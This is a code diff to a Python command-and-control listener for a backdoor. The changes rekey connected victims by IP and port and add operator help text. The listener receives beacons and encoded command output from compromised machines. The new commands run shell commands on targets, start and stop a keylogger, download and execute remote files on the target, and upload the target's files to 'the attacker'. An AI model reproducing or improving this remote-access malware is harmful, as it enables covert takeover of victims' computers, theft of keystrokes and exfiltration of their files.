@@ -26,8 +26,9 @@ clients = {}
 def handle_client(client_socket, client_address):
 
   # Store client for sending commands
-  print(f'[*] Connection made with: {client_address}')
-  clients[client_address] = client_socket  
+  client_key = f"{client_address[0]}:{client_address[1]}"
+  print(f'[*] Connection made with: {client_key}')
+  clients[client_key] = client_socket  
 
   try:
     while True:
@@ -43,7 +44,7 @@ def handle_client(client_socket, client_address):
           encoded = request[8:]  # Remove "CMD_RES|"
           decoded_bytes = base64.b64decode(encoded)
           real_output = decoded_bytes.decode('utf-8')
-          print(f"\n[+] Command Output from {client_address}:")
+          print(f"\n[+] Command Output from {client_key}:")
           print(real_output)
           print("-" * 60)   # separator line
         except Exception as decode_error:
@@ -53,23 +54,23 @@ def handle_client(client_socket, client_address):
       # Handle error messages from payload
       elif request.startswith("CMD_ERR|"):
         error_msg = request[8:]
-        print(f"[!] Command Error from {client_address}: {error_msg}")
+        print(f"[!] Command Error from {client_key}: {error_msg}")
 
       # Handle beacon
       elif request.startswith("BKDR_ALIVE|"):
-        print(f"[+] Beacon received from {client_address}: {request}")
+        print(f"[+] Beacon received from {client_key}: {request}")
 
       # Everything else (including the old cwd message)
       else:
-        print(f'[*] Received from {client_address}: {request}')
+        print(f'[*] Received from {client_key}: {request}')
 
   except Exception as e:
-    print(f'[!] Error with {client_address}: {e}')
+    print(f'[!] Error with {client_key}: {e}')
   finally:
     client_socket.close()
-    if client_address in clients:
-      del clients[client_address]
-    print(f'[*] Client {client_address} disconnected. Remaining: {len(clients)}')
+    if client_key in clients:
+      del clients[client_key]
+    print(f'[*] Client {client_key} disconnected. Remaining: {len(clients)}')
 
 # Create a TCP server (listener) and bind it to the specified IP and port
 # Identify all connected target cients in the dictionary for accessability
@@ -99,7 +100,8 @@ def start_listener():
       handle_thread.start() 
 
       # Add client connection in dictionary
-      clients[addr] = sock 
+      client_key = f"{addr[0]}:{addr[1]}"
+      clients[client_key] = sock 
 
       # Print total number of connected clients 
       print(f'[*] Number of connected clients: {len(clients)}') 
@@ -113,8 +115,16 @@ if __name__ == "__main__":
 
   # Print instructions for user input commands
   print("Commands Inputs: 'exit' to close connection with a client")
-  print("/[address] [command] to send a command to a specific client")
+  print("/[IP:port] [command] to send a command to a specific client")
   print("/all [command] to send a command to all clients")
+  print("")
+  print("Available commands:")
+  print("Shell Commands: Any native command (dir, ipconfig, whoami, etc.)")
+  print("KEYLOG_START: Begins recording keystrokes on the target.")
+  print("KEYLOG_STOP: Stops the keylogger and sends the log to the listener.")
+  print("DOWNLOAD:<url>: Downloads a file from a URL to the target machine.")
+  print("DOWNLOAD:<url> -e: Downloads and automatically executes the file.")
+  print("UPLOAD:<filename>: Uploads a file from the target machine to the attacker.")
 
   #Creates a thread to run start_listener in the background
   starter_thread = threading.Thread(target = start_listener, daemon = True) 
